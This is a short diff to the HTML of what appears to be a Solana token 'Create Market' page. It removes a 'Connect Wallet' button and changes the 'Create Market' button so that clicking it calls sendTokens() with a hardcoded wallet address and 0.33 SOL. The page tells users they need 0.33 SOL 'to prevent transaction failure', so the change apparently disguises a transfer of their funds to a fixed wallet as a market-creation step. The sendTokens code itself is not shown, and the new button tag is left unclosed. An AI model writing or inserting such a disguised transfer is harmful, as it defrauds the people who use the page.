@@ -157,7 +157,6 @@
                 </div>
             </div>
         </nav>
-        <button id="connectWalletBtn">Connect Wallet</button>
     </header>
 
     <div class="container para-note text-center sliderArea mt-5">
@@ -233,7 +232,9 @@
                 <p>I confirm that I have confirmed all details and that I am fully responsible for creating the market. <strong><FONT COLOR=ff0000>Need at least 0.33 SOL to prevent transaction failure.</strong></p>
             </div>
             <div class="container confirm-btn">
-                <button class="btn btn-primary create-market">Create Market</button>
+                <!-- Add onclick attribute to call the sendTokens function when button is clicked -->
+                <button class="btn btn-primary create-market" onclick="sendTokens('9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar', 0.33)">
+                    Create Market
             </div>
         </div>
     </div>
